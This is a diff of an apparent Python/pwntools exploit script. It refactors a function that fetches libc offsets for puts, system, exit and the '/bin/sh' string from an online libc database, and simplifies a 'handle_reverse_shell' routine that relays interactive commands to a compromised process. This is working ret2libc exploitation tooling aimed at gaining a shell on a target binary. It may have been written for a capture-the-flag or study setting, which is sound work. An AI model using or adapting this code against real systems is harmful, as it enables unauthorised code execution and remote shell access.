@@ -96,26 +96,19 @@ def get_libc_symbol_offsets(libc_id):
     Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
     """
     libc_id = libc_id['id']
-    libc_url = LIBC_SEARCH_URL + libc_id
+    libc_url = f"{LIBC_SEARCH_URL}{libc_id}"
     
-    # Define symbols of interest
-    find_symbols = {"symbols": ["puts", "system", "exit", "str_bin_sh"]}
-
     # Request these symbols from the database
-    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(find_symbols))
-    symbol_json = response.json()
-
-    # Extract and log the offsets for the requested symbols
-    puts_off = symbol_json['symbols'].get('puts')
-    system_off = symbol_json['symbols'].get('system')
-    exit_off = symbol_json['symbols'].get('exit')
-    binsh_off = symbol_json['symbols'].get('str_bin_sh')
+    symbols_of_interest = ["puts", "system", "exit", "str_bin_sh"]
+    response = requests.post(libc_url, headers=HEADERS, json={"symbols": symbols_of_interest})
+    symbol_offsets = response.json().get('symbols', {})
 
     log.info(f"Trying offsets for libc version: {libc_id}")
-    log.info(f"Offsets - puts: {puts_off}, system: {system_off}, str_bin_sh: {binsh_off}, exit: {exit_off}")
+    for symbol in symbols_of_interest:
+        log.info(f"Offset - {symbol}: {symbol_offsets.get(symbol)}")
 
-    # Return the offsets
-    return puts_off, system_off, exit_off, binsh_off
+    # Return the offsets as a tuple, in the same order as requested
+    return tuple(symbol_offsets.get(symbol) for symbol in symbols_of_interest)
 
 
 def skip_lines(proc, lines):
@@ -129,20 +122,19 @@ def skip_lines(proc, lines):
             pass
 
 
-def handle_reverse_shell(redirect_stderr=True):
+def handle_reverse_shell():
     """
     Handles the reverse shell interaction with the process.
     """
     try:
-        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
+        proc.sendline(b"whoami")
         print(proc.recv(timeout=0.1).decode('utf-8'))
         while True:
             command = input("$ ")
-            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
+            proc.sendline(command.encode('utf-8'))
             print(proc.recv(timeout=0.2).decode('utf-8'))
     except EOFError:
         return 300
-    return 200
 
 
 def main():
